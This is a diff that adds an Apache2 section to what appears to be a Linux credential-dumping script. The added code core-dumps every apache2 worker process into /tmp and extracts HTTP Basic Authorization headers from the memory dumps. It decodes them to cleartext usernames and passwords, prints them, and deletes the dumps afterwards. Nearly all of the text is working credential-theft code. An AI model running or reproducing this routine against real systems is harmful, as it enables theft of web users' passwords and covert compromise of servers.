@@ -134,3 +134,30 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	fi
 fi
 
+#If Apache2
+if [[ -e "/etc/apache2/apache2.conf" ]]; then
+        SOURCE="[HTTP BASIC - APACHE2]"
+        #get all apache workers /usr/sbin/apache2 -k start
+        PID="$(ps -eo pid,user,command | grep apache2 | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	#if exists aka apache2 running
+	if [[ $PID ]];then
+		#Dump all workers
+		while read -r pid; do
+		        gcore -o /tmp/apache ${pid}  >& /dev/null
+		done <<< $PID
+                #Get encoded creds
+		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
+                #for each extracted b64 - decode the cleartext
+                while read -r encoded; do
+			CREDS="$(echo $encoded | base64 -d)"
+			if [[ $CREDS ]]; then
+				echo "$SOURCE			$CREDS"
+			fi
+		done <<< "$DUMP"
+                
+		#cleanup
+                rm -rf /tmp/apache*
+
+	fi
+fi
+
